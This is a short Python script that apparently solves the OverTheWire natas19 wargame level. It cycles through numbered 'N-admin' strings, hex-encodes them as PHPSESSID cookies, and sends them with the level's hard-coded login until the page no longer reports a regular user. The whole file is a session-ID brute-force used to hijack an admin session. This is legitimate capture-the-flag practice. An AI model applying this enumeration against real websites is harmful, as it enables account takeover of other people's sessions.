import requests
import binascii


def admin_search():
	i = 142
	while True:
		path = 'http://natas19.natas.labs.overthewire.org/index.php'
		auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
		sessid = '{}-admin'.format(i)
		hex_sessid = sessid.encode("utf-8").hex()
		cookies = dict(PHPSESSID=hex_sessid)
		r = requests.get(path, auth=auth, cookies=cookies)
		print(hex_sessid)
		print(i)
		if 'regular user' not in r.text:
			return r.text
			break
		i = i+1


def main():
	print('Looking for admin...')
	admin_response = admin_search()
	print(admin_response)

main()